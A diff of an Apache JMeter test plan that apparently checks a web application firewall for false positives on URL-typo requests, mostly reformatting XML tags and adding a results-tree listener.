-              <stringProp name="parameters" />
+              <stringProp name="filename"></stringProp>
+              <stringProp name="parameters"></stringProp>
               <stringProp name="scriptLanguage">groovy</stringProp>
-              <stringProp name="script">def code = prev.getResponseCode()\nif (code != '403') {\n    prev.setSuccessful(true)\n    prev.setResponseMessage('Accepted non-403 status: ' + code)\n} else {\n    prev.setSuccessful(false)\n    prev.setResponseMessage('WAF 403 remained for FP candidate')\n}\n</stringProp>
+              <stringProp name="script">def code = prev.getResponseCode()\nif (code != &apos;403&apos;) {\n    prev.setSuccessful(true)\n    prev.setResponseMessage(&apos;Accepted non-403 status: &apos; + code)\n} else {\n    prev.setSuccessful(false)\n    prev.setResponseMessage(&apos;WAF 403 remained for FP candidate&apos;)\n}\n</stringProp>
             </JSR223PostProcessor>
-            <hashTree />
+            <hashTree/>
           </hashTree>
         </hashTree>
         <TransactionController guiclass="TransactionControllerGui" testclass="TransactionController" testname="TG4 URL Typo Mixed" enabled="true">
-          <boolProp name="TransactionController.parent">false</boolProp>
+          <boolProp name="TransactionController.includeTimers">true</boolProp>
         </TransactionController>
         <hashTree>
           <CSVDataSet guiclass="TestBeanGUI" testclass="CSVDataSet" testname="TG4 URL Typo CSV" enabled="true">
@@ -1424,7 +1415,7 @@
             <boolProp name="stopThread">false</boolProp>
             <stringProp name="variableNames">fp_case_id,fp_case_class,fp_url_typo_raw_path</stringProp>
           </CSVDataSet>
-          <hashTree />
+          <hashTree/>
           <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG4_url_typo_case" enabled="true">
             <stringProp name="HTTPSampler.path">${fp_url_typo_raw_path}</stringProp>
             <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
@@ -1432,7 +1423,7 @@
             <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
             <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
             <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-              <collectionProp name="Arguments.arguments" />
+              <collectionProp name="Arguments.arguments"/>
             </elementProp>
             <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
           </HTTPSamplerProxy>
@@ -1453,19 +1444,19 @@
                 </elementProp>
               </collectionProp>
             </HeaderManager>
-            <hashTree />
+            <hashTree/>
             <JSR223PostProcessor guiclass="TestBeanGUI" testclass="JSR223PostProcessor" testname="Accept URL Typo Statuses" enabled="true">
               <stringProp name="cacheKey">true</stringProp>
-              <stringProp name="filename" />
-              <stringProp name="parameters" />
+              <stringProp name="filename"></stringProp>
+              <stringProp name="parameters"></stringProp>
               <stringProp name="scriptLanguage">groovy</stringProp>
-              <stringProp name="script">def code = prev.getResponseCode()\nif (code != '403') {\n    prev.setSuccessful(true)\n    prev.setResponseMessage('Accepted non-403 status: ' + code)\n} else {\n    prev.setSuccessful(false)\n    prev.setResponseMessage('WAF 403 remained for FP candidate')\n}\n</stringProp>
+              <stringProp name="script">def code = prev.getResponseCode()\nif (code != &apos;403&apos;) {\n    prev.setSuccessful(true)\n    prev.setResponseMessage(&apos;Accepted non-403 status: &apos; + code)\n} else {\n    prev.setSuccessful(false)\n    prev.setResponseMessage(&apos;WAF 403 remained for FP candidate&apos;)\n}\n</stringProp>
             </JSR223PostProcessor>
-            <hashTree />
+            <hashTree/>
           </hashTree>
         </hashTree>
       </hashTree>
-      <ResultCollector guiclass="SimpleDataWriter" testclass="ResultCollector" testname="JTL Writer" enabled="true">
+      <ResultCollector guiclass="SimpleDataWriter" testclass="ResultCollector" testname="JTL Writer">
         <boolProp name="ResultCollector.error_logging">false</boolProp>
         <objProp>
           <name>saveConfig</name>
@@ -1501,7 +1492,44 @@
         </objProp>
         <stringProp name="filename">${result_file}</stringProp>
       </ResultCollector>
-      <hashTree />
+      <hashTree/>
+      <ResultCollector guiclass="ViewResultsFullVisualizer" testclass="ResultCollector" testname="View Results Tree">
+        <boolProp name="ResultCollector.error_logging">false</boolProp>
+        <objProp>
+          <name>saveConfig</name>
+          <value class="SampleSaveConfiguration">
+            <time>true</time>
+            <latency>true</latency>
+            <timestamp>true</timestamp>
+            <success>true</success>
+            <label>true</label>
+            <code>true</code>
+            <message>true</message>
+            <threadName>true</threadName>
+            <dataType>true</dataType>
+            <encoding>false</encoding>
+            <assertions>true</assertions>
+            <subresults>true</subresults>
+            <responseData>false</responseData>
+            <samplerData>false</samplerData>
+            <xml>false</xml>
+            <fieldNames>true</fieldNames>
+            <responseHeaders>false</responseHeaders>
+            <requestHeaders>false</requestHeaders>
+            <responseDataOnError>false</responseDataOnError>
+            <saveAssertionResultsFailureMessage>true</saveAssertionResultsFailureMessage>
+            <assertionsResultsToSave>0</assertionsResultsToSave>
+            <bytes>true</bytes>
+            <sentBytes>true</sentBytes>
+            <url>true</url>
+            <threadCounts>true</threadCounts>
+            <idleTime>true</idleTime>
+            <connectTime>true</connectTime>
+          </value>
+        </objProp>
+        <stringProp name="filename"></stringProp>
+      </ResultCollector>
+      <hashTree/>
     </hashTree>
   </hashTree>
 </jmeterTestPlan>
